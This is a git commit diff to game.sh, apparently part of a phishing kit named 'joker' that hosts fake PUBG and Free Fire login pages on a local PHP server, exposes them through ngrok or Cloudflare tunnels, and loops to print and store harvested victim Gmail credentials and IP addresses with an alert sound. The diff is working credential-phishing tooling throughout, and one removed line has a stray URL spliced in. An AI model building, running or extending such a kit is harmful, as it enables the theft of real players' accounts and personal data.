d64cf45f6cd2becc9d06b6376e276b42e16f53ed
sukhdevr898 <59791782+sukhdevr898@users.noreply.github.com>
2022-02-22 11:51:35 +0530

    Update game.sh

--- game.sh
+++ game.sh
@@ -1,3 +1,39 @@
+#################################functions
+flare(){
+echo -e "\e[96m        |=====================================================|"
+echo -e "\e[96m        |                      CLOUDFLARED SERVER             |"
+echo -e "\e[96m        |         copy this command =>(  bash flare.sh   )    |"
+echo -e "\e[96m        |     OPEN NEW SESSION AND RUN ABOVE COMMAND          |"
+echo -e "\e[96m        |=====================================================|"
+
+}
+local(){
+php -S localhost:8080 > /dev/null 2>1&
+echo -e "\e[96m        |=====================================================|"
+echo -e "\e[96m        |      [\e[92m1\e[96m]==> NGROK                       |"
+echo -e "\e[96m        |      [\e[92m2\e[96m]==> CLOUDFLARE                  |"
+echo -e "\e[96m        |=====================================================|"
+read -p "CHOOSE SERVER : " flare
+if [ $flare == 1 ];
+then 
+ngrok
+
+elif [ $flare == 2 ];
+then 
+flare
+fi
+}
+link(){
+if [ -e link.txt ];
+then
+rm link.txt
+fi
+
+curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io" > link.txt
+
+
+
+}
 ngrok(){
 cd $HOME
 echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT "
@@ -8,8 +44,9 @@ echo -e "\e[92m \n\t\t NGROK STARTING... "
 
 ./ngrok http 8080 > /dev/null 2>1&
 sleep 5.0
+cd joker/.sites/$url
+link
 
-bash joker/link.sh
 echo -e "\e[96m \n \tLOCALHOST : "
 echo -e "\e[94m                 ┃"
 echo -e "\e[94m                 ┃"
@@ -28,6 +65,26 @@ echo -e " $(cat link.txt)"
 echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
 
 }
+
+ip(){
+
+if [ -e ip.txt ];
+then 
+mpv $HOME/joker/cap.mp3 > /dev/null 2>1&
+
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+
+echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
+echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
+echo -e "\n"
+echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
+echo -e "\e[94m\n┃-------  (SAVE IN IP.TXT)  -------┃"
+rm ip.txt
+echo -e "\n"
+fi
+}
+
+
 
 
 
@@ -54,23 +111,19 @@ case $pubg in
 1)
 
 cd .sites/pubg/notp
-bash local.sh
+url="pubg/notp"
+local
 
-ngrok
-cd joker/.sites/pubg/notp
+
 while true;
 
 do
+ip
+
 if [ -e gmail.txt ];
 then
 mpv $HOME/joker/cap.mp3 > /dev/null 2>1&
-echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
 
-echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
-echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
-echo -e "\n"
-echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
-echo -e "\e[94m\n┃-------  $IP  -------┃"
 
 echo -e "\n"
 echo -e "\e[98m \n\tGMAIL :  $(cat gmail.txt)  "
@@ -90,22 +143,17 @@ done
 ;;
 2)
 cd .sites/freefire/notp
-bash local.sh
-ngrok
-cd .sites/freefire/notp
+url="freefire/notp"
+local
+
 while true;
 
 do
+ip
 if [ -e gmail.txt ];
 then
 mpv $HOME/joker/cap.mp3 > /dev/null 2>1&
-echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
 
-echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
-echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
-echo -e "\n"https://raw.githubusercontent.com/sukhdevr898/joker/main/update1.0
-echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
-echo -e "\e[94m\n┃-------  $IP  -------┃"
 echo -e "\n"
 echo -e "\e[98m $(cat gmail.txt)  "
 cat gmail.txt >> $HOME/joker/www/ff.txt
